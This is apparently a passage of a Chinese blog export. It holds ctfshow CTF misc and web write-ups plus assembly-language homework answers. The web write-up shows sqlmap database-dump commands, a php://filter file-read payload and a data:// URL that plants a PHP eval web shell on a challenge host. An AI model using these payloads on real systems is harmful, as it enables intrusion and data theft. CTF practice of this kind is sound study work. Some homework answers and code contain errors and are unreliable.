class="line">    <span class="keyword">return</span> crclist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filecrc = getCrc()</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculateCrc</span>():</span><br><span class="line">    <span class="keyword">global</span> res</span><br><span class="line">    <span class="keyword">for</span> filenum <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dic:    <span class="comment"># 层数，本题中只有一个字节，那就用一层循环就行</span></span><br><span class="line">            s = <span class="built_in">str</span>(i).encode()</span><br><span class="line">            <span class="keyword">if</span> binascii.crc32(s) == filecrc[filenum]:</span><br><span class="line">                res = res + i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = calculateCrc()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>然后得密码为<code>447^*5#)7</code>，解压后得一张n.png的图片，发现文件的十六进制内容反了，从winhex复制下来转为正常的顺序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="built_in">open</span>(<span class="string">&#x27;hex.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">reshex = <span class="built_in">open</span>(<span class="string">&#x27;reshex.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">hex1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(txt)//<span class="number">2</span>):</span><br><span class="line">    hex1.append(txt[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>])</span><br><span class="line">hex1 = hex1[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex1:</span><br><span class="line">    reshex.write(i)</span><br></pre></td></tr></table></figure><p>flag<br><code>flag&#123;我好难啊&#125;</code></p><h3 id="stega11"><a href="#stega11" class="headerlink" title="stega11"></a>stega11</h3><p><code>MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</code><br>base32解一下<br><code>flag&#123;6f1797d4080b29b64da5897780463e30&#125;</code></p><h3 id="misc31"><a href="#misc31" class="headerlink" title="misc31"></a>misc31</h3><p>先把能解压的解出来，在file文件里面有base64，转图片得pdf文件的解压密码为<code>dlddddhm</code>。pdf文件里面有fafa，花朵解密后为<code>qwertyuiop</code>。pdf文件经过wbstego4隐写工具decode一下得<code>ENTYNSTLWNRNTKYW13287484</code>，再有提示关键字进行关键字解密<code>CVEFVWETBVDVESFB13287484</code>，解压出另一个音频，用steghide解出来flag.txt，口令是<code>xiaomotuo</code>。flag是<code>flag&#123;du_du_du_du&#125;</code>。</p><h3 id="misc49"><a href="#misc49" class="headerlink" title="misc49"></a>misc49</h3><p>压缩包里面有一个txt，内容还是一个压缩包，后缀名改为<code>.zip</code>，hint.txt可以拉出来，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZVZYCVZYQVTVZVZYQVTVZTTCAVZYQVTVZVTVZTTBZTTBZVZYQVTVZVZYQVTVZVZYSVZYQVTVZVZYQVTVZTTCAVTVZTTBZTTBZTTBZTTBZVZYQVTVZVTVZTTBZVZYOVZYQVTVZVZYQVTVZTTCAVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYPVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYCVZYQVTVZVZYQVTVZVZYSVZYQVTVZVTVZTTBZTTBZVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVZYQVTVZVZYQVTVZVZYQVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVTVZVTVZTTBZTTBZTTBZVZYCVZYQVTVZVTVZTTBZVZYPVZYQVTVZVZYQVTVZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYPVZYQVTVZVZYQVTVZTTCAVZYQVTVZVTVZTTBZVZYOVTVZTTBZTTBZTTBZVZYOVTVZTTBZTTBZTTBZVZYOVTVZTTBZTTBZTTBZVZYCVZYQVTVZVTVZTTBZVZYOVZYQVTVZVTVZTTBZVZYPVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYNVZYQVTVZVTVZTTBZTTBZVZYQVTVZVTVZTTBZVZYPVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYNVZYQVTVZVTVZTTBZTTBZVZYQVTVZVTVZTTBZVZYPVZYQVTVZVZYQVTVZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYPVTVZTTBZTTBZTTBZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYSVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVZYQVTVZVTVZVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVZYQVTVZVZYSVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVTVZTTBZVZYPVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZTTCAVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYPVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVVURVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYOVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYOVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYPVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYOVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVZYQVTVZVVURVTVZVTVZVTVZVZYQTTCAVTVZVTVZVTVZVZYQTTCAVZYNTTTQTTTQ==</span><br></pre></td></tr></table></figure><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">字母解密</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭‖‖¶♩‖¶¶¶¶‖¶¶¶♩♭‖♭‖§♭‖‖¶¶♭‖♭‖♯♭‖♭‖§‖¶¶¶¶♭‖‖¶♫♭‖♭‖§‖¶¶¶♪‖¶¶¶¶♭‖‖¶♩‖¶¶¶♬‖¶¶¶¶‖¶¶¶♪♭‖‖¶♩♭‖♭‖♩♭‖♭‖♯♭‖‖¶¶♭‖‖¶♩♭‖♭‖♩‖¶¶¶♪♭‖♭‖♭♭‖‖¶♩♭‖♭‖‖‖¶¶¶♩♭‖‖¶♬♭‖♭‖♩♭‖♭‖♩‖¶¶¶♬♭‖♭‖§♭‖‖¶♫‖¶¶¶♫‖¶¶¶♫‖¶¶¶♩♭‖‖¶♫♭‖‖¶♬♭‖‖¶♩♭‖‖¶♩♭‖‖¶♩♭‖♭‖♪♭‖‖¶¶♭‖‖¶♬♭‖‖¶♩♭‖♭‖♪♭‖‖¶¶♭‖‖¶♬♭‖♭‖♩♭‖♭‖♩‖¶¶¶♬‖¶¶¶♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖♯‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖‖¶♩‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶♭‖♭‖‖‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶♭‖♭‖♯‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶♭‖‖¶♬‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖‖¶♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖§‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩‖¶¶¶♬‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖∮‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖‖¶♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♫♭‖♭‖♩‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶‖¶¶¶¶‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♫♭‖♭‖♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩‖¶¶¶♬‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶‖¶¶¶¶‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖‖¶♫‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶♭‖♭‖∮‖‖‖♭§‖‖‖♭§♪==</span><br></pre></td></tr></table></figure><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">音乐解密</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❀✿✼❇❃❆❇✿❁❇✻✿❀✾✿✻❀❊❆❃❀❊✻❅❀❄✼❂❊❊✾❇❁✽✽✼❁❂❀❀❀❉❃❂❀❉❃❂❊❊✾✼✻✻❀❆✻✻❀❀✻✻✿❄✻✻✿❆✻✻✿❂✻✻❀❀✻✻❀❇✻✻❀✾✻✻❀❊✻✻❀❈✻✻❀❀✻✻❁❊✻✻✿✿✻✻❀❊✻✻❁❊✻✻❀✾✻✻✿✿✻✻❀❁✻✻✿❈==</span><br></pre></td></tr></table></figure><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo">花朵解密</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">听说水印很强大，我来康康！key&#123;welcome_to_ctf&#125;</span><br></pre></td></tr></table></figure><p>解密的密码为<code>welcome_to_ctf</code></p><p>提示水印，用盲水印工具<code>BlindWaterMark</code>，有python3的改编版，还挺好用。<br>图片不是很清晰，不太好看出来奥。<br><code>flag&#123;y0u_are_we1l&#125;</code></p><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><p>给了个flag.png，stegslove打开，red plane 4在我女朋友头上发现flag<code>flag&#123;so_good_you_are&#125;</code></p><h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">千千秀字文本加密为字母</a><br><code>flag&#123;ctfshow_nice!&#125;</code></p><h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><p>一看内容就是加密文档，换成docx后缀名，<a href="https://down.52pojie.cn/?query=accent%20office%20password%20recovery">office加密文档爆破密码工具下载链接</a><br>emmm，爆破密码为&#96;&#96;，那个工具用不了哎，那就算了吧，office加密等有空了再找工具</p><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web练习一</title>
      <link href="/2021/02/18/ctfshow-web%E7%BB%83%E4%B9%A0%E4%B8%80/"/>
      <url>/2021/02/18/ctfshow-web%E7%BB%83%E4%B9%A0%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="芜湖"><a href="#芜湖" class="headerlink" title="芜湖"></a>芜湖</h2><p>在家划水加考驾照已经过去一个月了，驾照拿到了，web手艺要重新拾起来了，头痛啊头痛。。。先做做ctfshow上面的ctf练习题练练手吧。。。</p><h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>源码里面发现了flag的痕迹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">Y3Rmc2hvd3tkY2NjZTlhZC02YjRkLTRiNzMtYTExNC04NDVjYjNkMmM0ODR9--&gt;</span><br></pre></td></tr></table></figure><p>看起来像是base64编码，解码之后获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;dccce9ad-6b4d-4b73-a114-845cb3d2c484&#125;</span><br></pre></td></tr></table></figure><h3 id="web2-最简单的SQL注入"><a href="#web2-最简单的SQL注入" class="headerlink" title="web2-最简单的SQL注入"></a>web2-最简单的SQL注入</h3><p>既然是最简单的SQL注入，那就拿sqlmap来跑吧，嘤嘤嘤</p><p>数据包接下来，然后用sqlmap跑数据库名</p><ul><li><p>第一步<br><code>sqlmap -r 1.txt -dbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">available databases [6]:</span><br><span class="line">[*] ctftraining</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] web2</span><br></pre></td></tr></table></figure></li><li><p>第二步<br><code>sqlmap -r 1.txt -D web2 -tables</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: web2</span><br><span class="line">[2 tables]</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">| user |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure></li><li><p>第三步<br><code>sqlmap -r 1.txt -D web2 -T flag -columns</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">atabase: web2</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| flag   | varchar(255) |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure></li><li><p>第四步<br><code>sqlmap -r 1.txt -D web2 -T flag -dump</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: web2</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| flag                                          |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| ctfshow&#123;55342700-f2a5-4a8b-b5ad-e4f1805b8d90&#125; |</span><br><span class="line">+-----------------------------------------------+</span><br></pre></td></tr></table></figure></li></ul><p>下面就是flag<br><strong>ctfshow{55342700-f2a5-4a8b-b5ad-e4f1805b8d90}</strong></p><h3 id="web3-更简单的web题"><a href="#web3-更简单的web题" class="headerlink" title="web3-更简单的web题"></a>web3-更简单的web题</h3><p>嘤嘤嘤，任意文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>没搞到，可见文件名或许不是flag.php或者其他情况，这种情况下用data伪协议，用马来获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?url=data://text/plain,&lt;?php%20phpinfo()?&gt;可以用，那我们就直接传马吧</span><br><span class="line"></span><br><span class="line">http://84eac934-71b2-43ce-bf71-a5bf3d9b73b7.chall.ctf.show:8080/?url=data://text/plain,%3C?php%20@eval($_POST[m4]);?%3E</span><br></pre></td></tr></table></figure><p>用工具连接一下，ctfgogogo得flag<br><code>ctfshow&#123;ce0abe95-7b95-479c-964f-cc3693a20cf2&#125;</code></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>跟web3类似，试试同样的办法，看起来是禁用了一些危险的单词字符。。。八嘎，都禁了，看wp知道有日志注入或者远程文件包含。还好我的服务器还有两个月才会过期，还能试试能不能用远程文件包含。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyQT5入门练习</title>
      <link href="/2021/02/16/pyQT5%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/02/16/pyQT5%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="入门pyQT5第一天"><a href="#入门pyQT5第一天" class="headerlink" title="入门pyQT5第一天"></a>入门pyQT5第一天</h2><p>咯咯咯咯~~~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pyQT5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言与接口技术作业二</title>
      <link href="/2020/12/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%9A%E4%BA%8C/"/>
      <url>/2020/12/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%9A%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="第四章-80x86汇编语言程序设计"><a href="#第四章-80x86汇编语言程序设计" class="headerlink" title="第四章 80x86汇编语言程序设计"></a>第四章 80x86汇编语言程序设计</h2><h3 id="1-伪指令语句与硬指令语句的本质区别是什么？伪指令有什么主要作用？"><a href="#1-伪指令语句与硬指令语句的本质区别是什么？伪指令有什么主要作用？" class="headerlink" title="1.伪指令语句与硬指令语句的本质区别是什么？伪指令有什么主要作用？"></a>1.伪指令语句与硬指令语句的本质区别是什么？伪指令有什么主要作用？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">答：区别：伪指令语句是能执行的语句，硬指令语句是CPU可以执行的语句。</span><br><span class="line"></span><br><span class="line">伪指令语句主要作用是为汇编程序提供解释说明，它仅仅是在汇编过程中告诉汇编程序如何进行汇编。</span><br></pre></td></tr></table></figure><h3 id="7-假设MYWORD是一个字变量，MYBYTE1和MYBYTE2是两个字节变量，指出下列语句中的错误及其原因。"><a href="#7-假设MYWORD是一个字变量，MYBYTE1和MYBYTE2是两个字节变量，指出下列语句中的错误及其原因。" class="headerlink" title="7.假设MYWORD是一个字变量，MYBYTE1和MYBYTE2是两个字节变量，指出下列语句中的错误及其原因。"></a>7.假设MYWORD是一个字变量，MYBYTE1和MYBYTE2是两个字节变量，指出下列语句中的错误及其原因。</h3><ul><li>1.<code>MOV BYTE PTR[BX], 1000</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">答：数据类型不匹配，目的地址单元是字节单元，1000大于255。无法存放。</span><br></pre></td></tr></table></figure></li><li>2.<code>MOV BX, OFFSET[SI]</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">答：OFFSET后只能跟标识符。</span><br></pre></td></tr></table></figure></li><li>3.<code>CMP MYBYTE1, MYBYTE2</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">答：CMP的两个操作数不能同时在存储器中。</span><br></pre></td></tr></table></figure></li><li>4.<code>MOV AL, MYBYTE1+MYBYTE2</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">答：运算符只能对常数进行操作，不能对变量进行操作。</span><br></pre></td></tr></table></figure></li><li>5.<code>SUB AL, MYWORD</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">答：数据类型不匹配，AL是8位的，MYWORD是16位变量。</span><br></pre></td></tr></table></figure></li><li>6.<code>JNZ MYWORD</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">答：MYWORD是变量，其指的单元中存放的是操作数，不能用做跳转入口。</span><br></pre></td></tr></table></figure></li></ul><h3 id="19-按下面要求写一个简化段定义格式的源程序"><a href="#19-按下面要求写一个简化段定义格式的源程序" class="headerlink" title="19.按下面要求写一个简化段定义格式的源程序"></a>19.按下面要求写一个简化段定义格式的源程序</h3><ul><li>1.定义常量NUM，其值为5；数据段中定义字数组变量DATALIST，它的头5个字单元中依次存放-1，0，2，5和4，最后一个单元初值不定。</li><li>2.代码段中的程序将DATALIST中头NUM个数的累加和存入DATALIST的最后1个字单元中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.model small</span><br><span class="line">.stack</span><br><span class="line">.data</span><br><span class="line">    num equ 5</span><br><span class="line">    datalist dw -1,0,2,5,4,?</span><br><span class="line">.code</span><br><span class="line">.startup</span><br><span class="line">    mov bx, offset datalist</span><br><span class="line">    mov CX, num</span><br><span class="line">    xor ax, ax</span><br><span class="line">again:</span><br><span class="line">    add ax, [bx]</span><br><span class="line">    inc bx</span><br><span class="line">    inc bx</span><br><span class="line">    loop again</span><br></pre></td></tr></table></figure></li></ul><h3 id="27-假设AX和SI存放的是有符号数，DX和DI存放的是无符号数，请用比较指令和条件转移指令实现以下判断。"><a href="#27-假设AX和SI存放的是有符号数，DX和DI存放的是无符号数，请用比较指令和条件转移指令实现以下判断。" class="headerlink" title="27.假设AX和SI存放的是有符号数，DX和DI存放的是无符号数，请用比较指令和条件转移指令实现以下判断。"></a>27.假设AX和SI存放的是有符号数，DX和DI存放的是无符号数，请用比较指令和条件转移指令实现以下判断。</h3><p>(1) 若DX&gt;DI，转到ABOVE执行<br>(2) 若AX&gt;SI，转到GREATER执行。<br>(3) 若CX&#x3D;0，转到ZERO执行<br>(4) 若AX-SI产生溢出，转到OVERFLOW执行。<br>(5) 若SI≤AX，转到LESS_EQ执行。<br>(6) 若DI≤DX，转到BELOW_EQ执行。<br><strong><code>答：</code></strong><br>(1) CMP DX,DI JA ABOVE<br>(2) CMP AX,SI JG GREATER<br>(3) CMP CX,0 JE ZERO<br>(4) CMP AX,SI<br>    JO OVERFLOW<br>(5) CMP AX,SI<br>    JGE LESS_EQ<br>(6) CMP DX,DI<br>    JAE BELOW_EQ</p><h3 id="33-已知用于LED数码管显示的代码表为"><a href="#33-已知用于LED数码管显示的代码表为" class="headerlink" title="33.已知用于LED数码管显示的代码表为"></a>33.已知用于LED数码管显示的代码表为</h3><p>LEDTABLE DB 0C0H,0FGH,0A4H,0B0H,99H,92H,82H,0F8H<br>         DB 80H,90H,88H,83H,0C6H,0C1 H,86H,8EH<br>它依次表示0<del>9A</del>F这16个数码的显示代码。编写一个程序实现将LEDNUM中的一个数字(0<del>9,A</del>F)转换成对应的LED显示代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.model small</span><br><span class="line">.stack 256</span><br><span class="line">.data</span><br><span class="line">    LEDTABLE DB 0c0h,0a4h,0b0h,99h,92h,82h.0f8h</span><br><span class="line">    DB 80h,90h,88h,83h,0c6h,0clh,86h,8eh</span><br><span class="line">    LEDNUM DB?</span><br><span class="line">.code</span><br><span class="line">.startup</span><br><span class="line">    mov bx,offset LEDTABLE</span><br><span class="line">    mov al,LEDNUM</span><br><span class="line">    xlat                                          ;al 中存在对应的LED显示代码</span><br><span class="line">    exit 0</span><br></pre></td></tr></table></figure><h2 id="第五章-存储器技术"><a href="#第五章-存储器技术" class="headerlink" title="第五章 存储器技术"></a>第五章 存储器技术</h2><h3 id="7-简要说明Cache的地址映射方式。Cache的替换算法主要有哪些？为何要进行替换？"><a href="#7-简要说明Cache的地址映射方式。Cache的替换算法主要有哪些？为何要进行替换？" class="headerlink" title="7.简要说明Cache的地址映射方式。Cache的替换算法主要有哪些？为何要进行替换？"></a>7.简要说明Cache的地址映射方式。Cache的替换算法主要有哪些？为何要进行替换？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cache内存的地址映射主要有以下三种方式：</span><br><span class="line">一、直接映像</span><br><span class="line">二、全相联映像</span><br><span class="line">三、组相联映像</span><br><span class="line"></span><br><span class="line">1.LRU（Least Recently Used）最近最少使用策略。</span><br><span class="line">2.LFU（Lease Frequently Used）最不经常使用策略。</span><br><span class="line">3.随机替换策略。</span><br><span class="line"></span><br><span class="line">Cache替换算法是影响代理缓存系统性能的一个重要因素，一个好的Cache替换算法可以产生较高的命中率。</span><br></pre></td></tr></table></figure><h3 id="9-假设有一个具有20位地址和16位字长的存储器，请问："><a href="#9-假设有一个具有20位地址和16位字长的存储器，请问：" class="headerlink" title="9.假设有一个具有20位地址和16位字长的存储器，请问："></a>9.假设有一个具有20位地址和16位字长的存储器，请问：</h3><p>&lt;1&gt;该存储器能存储多少个字节的信息？  2^20 x 16 b &#x3D; 16Mb<br>&lt;2&gt;如果该存储器由32kx8b的SARM芯片组成，需要多少片？2^24b ÷ 2^15*8 &#x3D; 2^6 &#x3D; 64片<br>&lt;3&gt;需要多少位地址进行芯片选择？64 &#x3D; 2^6，所以需要6位地址进行芯片选择。</p><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><h3 id="1-简述接口的概念和功能"><a 